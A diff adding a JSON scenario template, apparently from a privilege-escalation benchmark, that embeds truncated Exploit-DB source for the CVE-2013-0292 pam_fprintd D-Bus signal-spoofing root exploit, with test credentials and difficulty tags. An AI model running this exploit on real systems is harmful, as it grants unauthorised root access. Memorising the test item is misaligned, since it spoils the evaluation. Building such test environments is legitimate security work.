@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_33614",
+  "category": "A5_dbus",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: dbus-glib pam_fprintd - Local Privilege Escalation (CVE-2013-0292;OSVDB-90302)\n\nExploit source code (33614.c):\n```\n/* darklena. fprintd/pam_fprintd local root PoC. However dbus-glib plays an important role.\n *\n * (C) 2013 Sebastian Krahmer, all rights reversed.\n *\n * pam_fprintd uses net.reactivated.Fprint service to trigger finger swiping and\n * registers DBUS signal inside the PAM authentication function:\n *\n *       dbus_g_proxy_add_signal(dev, \"VerifyStatus\", G_TYPE_STRING, G_TYPE_BOOLEAN, NULL);\n *       dbus_g_proxy_add_signal(dev, \"VerifyFingerSelected\", G_TYPE_STRING, NULL);\n *       dbus_g_proxy_connect_signal(dev, \"VerifyStatus\", G_CALLBACK(verify_result),\n *                                   data, NULL);\n *\n * Then, when the DBUS signal arrives, the signal argument is basically just checked\n * to be the \"verify-match\" string; which however is expected to come from the legit\n * net.reactivated.Fprint service. Since there is no message filter registered in either\n * pam_fprintd, nor inside dbus-glib which it is using, such signals can be spoofed\n * by anyone. In order to do so, we first need to spoof a NameOwnerChanged signal\n * so the dbus_g_proxy_manager_filter() function inside dbus-glib will find our\n * sender-name (which cannot be spoofed) inside its hash tables and match it to\n * net.reactivated.Fprint.\n *\n * To test this PoC, start a service (su is fine) as user that is using pam_fprintd.\n * On a second xterm, when you see 'Swipe your ... finger' message start this PoC\n * and you will notice that a rootshell is spawned in the first xterm w/o giving your finger. :p\n *\n * Used various DBUS tutorials and example code, while writing this.\n *\n * $ cc darklena.c `pkg-config --cflags dbus-1` -ldbus-1 -Wall\n *\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <errno.h>\n#include <dbus/dbus.h>\n\n\nvoid die(const char *s)\n{\n  perror(s);\n  exit(errno);\n}\n\n\nint main(int argc, char **argv)\n{\n  DBusError err;\n  DBusConnection *conn = NULL;\n  DBusMessage *vrfy_msg = NULL, *noc_msg = NULL, *nl_msg = NULL, *reply = NULL;\n  dbus_uint32_t serial = 0;\n  dbus_bool_t t = 1;\n  int un = 0, i = 0, reply_to = -1;\n  const char *vrfy_match = \"verify-match\", *cname = NULL,\n             *name = \"net.reactivated.Fprint\", *prev_owner = NULL;\n  char dest[32];\n\n  /* override unique name of net.reactivated.Fprint */\n  if (argc > 1)\n    prev_owner = strdup(argv[1]);\n\n  printf(\"\\n[**] darklena, pam_fprintd PoC exploit 2013\\n\\n\");\n\n  printf(\"[*] Initializing DBUS ...\\n\");\n  dbus_error_init(&err);\n  conn = dbus_bus_get(DBUS_BUS_SYSTEM, &err);\n\n  if (dbus_error_is_set(&err)) {\n    fprintf(stderr, \"Error: %s\\n\", err.message);\n    die(\"dbus_error_is_set\");\n  }\n\n  if ((cname = dbus_bus_get_unique_name(conn)) == NULL)\n    die(\"dbus_bus_get_unique_name\");\n\n  un = atoi(strchr(cname, '.') + 1);\n\n  printf(\"[+] Done. Found my unique name: %s (%d)\\n\", cname, un);\n\n  if (!prev_owner) {\n    printf(\"[*] Trying to find unique name of '%s' ...\\n\", name);\n    nl_msg = dbus_message_new_method_call(\"org.freedesktop.DBus\",\n                                       \n```",
+  "cve": "CVE-2013-0292;OSVDB-90302",
+  "exploitdb_id": "33614",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_33614",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
